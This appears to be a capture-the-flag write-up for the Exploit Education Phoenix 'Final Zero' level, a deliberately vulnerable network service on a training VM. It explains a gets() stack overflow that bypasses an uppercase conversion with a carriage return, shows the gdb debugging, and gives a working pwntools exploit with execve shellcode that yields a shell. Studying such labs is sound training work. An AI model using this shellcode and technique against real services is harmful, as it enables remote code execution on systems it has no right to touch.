@@ -1,0 +1,178 @@
+---
+title: "Final Zero"
+permalink: "exploit-education/phoenix/:title"
+layout: post
+---
+
+
+```c
+#include <ctype.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BANNER \
+  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+char *gets(char *s);
+
+/*
+ * Read the username in from the network
+ */
+
+char *get_username() {
+  char buffer[512];
+  char *q;
+  int i;
+
+  memset(buffer, 0, sizeof(buffer));
+  gets(buffer);
+
+  /* Strip off trailing new line characters */
+  q = strchr(buffer, '\n');
+  if (q) *q = 0;
+  q = strchr(buffer, '\r');
+  if (q) *q = 0;
+
+  /* Convert to lower case */
+  for (i = 0; i < strlen(buffer); i++) {
+    buffer[i] = toupper(buffer[i]);
+  }
+
+  /* Duplicate the string and return it */
+  return strdup(buffer);
+}
+
+int main(int argc, char **argv, char **envp) {
+  char *username;
+
+  printf("%s\n", BANNER);
+  fflush(stdout);
+
+  username = get_username();
+  printf("No such user %s\n", username);
+}
+```
+
+This level has a classic stack buffer overflow through **gets** function, so we inject our shellcode in the buffer then overflow the buffer and jump to our shellcode address, easy right :)
+
+The problem here is the for loop that converts every character in our buffer to uppercase using **toupper** function, so our shellcode will be ruined.
+
+If we look before the for loop we can see that the code terminates the buffer at any newline **\n** or carriage return **\r**.
+
+If we enter a newline our input will terminate anyway so nothing to do here but the carriage return **\r** doesn't terminate the input, we can see the man page for **get**:
+
+```
+DESCRIPTION
+       Never use this function.
+       gets()  reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\0').
+```
+
+As we see **gets** will terminate the input on **'\n'** and **'\0'** only, great.
+
+So the exploit here is to place our shellcode after **\r** with will be replaced by **'\0'** so that the for loop can't reach our shellcode (**strlen** stops at '\0').
+
+```
+$ gdb -q /opt/phoenix/amd64/final-zero 
+Reading symbols from /opt/phoenix/amd64/final-zero...(no debugging symbols found)...done.
+
+gef➤  disassemble get_username 
+Dump of assembler code for function get_username:
+.....
+   0x00000000004007f2 <+37>:	lea    rax,[rbp-0x220]
+   0x00000000004007f9 <+44>:	mov    rdi,rax
+   0x00000000004007fc <+47>:	call   0x4005d0 <gets@plt>
+   0x0000000000400801 <+52>:	lea    rax,[rbp-0x220]
+.....
+
+gef➤  b *0x0000000000400801
+Breakpoint 1 at 0x400801
+
+gef➤  r
+Starting program: /opt/phoenix/amd64/final-zero 
+Welcome to phoenix/final-zero, brought to you by https://exploit.education
+AAAAAAAA
+Breakpoint 1, 0x0000000000400801 in get_username ()
+
+gef➤  x/xg $rbp-0x220
+0x7fffffffe410:	0x4141414141414141
+```
+
+The buffer is at offset 0x220 = 544 bytes and it's at address **0x7fffffffe410**, great (not really).
+
+If you tried to overwrite **RIP** with this address the exploit won't work so we should investigate more.
+
+We need to debug the process we are sending the payload to instead of debugging locally, so we will open two terminals one for the connection and another for gdb.
+
+```
+# First Terminal:
+
+$ nc localhost 64003
+Welcome to phoenix/final-zero, brought to you by https://exploit.education
+```
+
+```
+# Second Terminal:
+
+$ ps aux | grep final
+phoenix+ 14770  0.5  0.0    752     4 ?        Ss   18:55   0:00 /opt/phoenix/amd64/final-zero
+user     14772  0.0  0.0   5136   984 pts/2    S+   18:55   0:00 grep final
+
+$ sudo gdb -p 14770
+Attaching to process 14770
+Reading symbols from target:/opt/phoenix/amd64/final-zero...(no debugging symbols found)...done.
+
+gef➤  b *0x0000000000400801
+Breakpoint 1 at 0x400801
+
+gef➤  c
+Continuing.
+```
+
+Now enter some input in the first terminal like "AAAAAAAA".
+
+```
+Breakpoint 1, 0x0000000000400801 in get_username ()
+
+gef➤  x/xg $rbp-0x220
+0x7fffffffea60: 0x4141414141414141
+```
+
+As you can see the address of buffer if very far from our first address, offset between them = 0x7fffffffea60 - 0x7fffffffe410 = 1616 bytes.
+
+So we will replace our **RIP** with an address close enough to **0x7fffffffea60** and we are done.
+
+# Solution:
+
+```python
+# solve.py
+
+from pwn import *
+
+shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
+
+con = remote('localhost', 64003)
+print(con.recvline())					# receive the greeting message
+
+buff = ""
+buff += 'A'*7 + '\r'					# JUNK
+buff += '\x90'*200					# some NOPS
+buff += shellcode					# our shellcode
+buff += 'A' * (544 - len(buff))				# JUNK
+buff += 'BBBBBBBB'					# RBP value
+buff += p64(0x7fffffffea90)				# RIP value
+
+con.send(buff)						# send the payload
+con.interactive()					# interactive shell
+```
+
+```
+$ python solve.py 
+[+] Opening connection to localhost on port 64003: Done
+Welcome to phoenix/final-zero, brought to you by https://exploit.education
+[*] Switching to interactive mode
+
+$ whoami
+phoenix-amd64-final-zero
+```
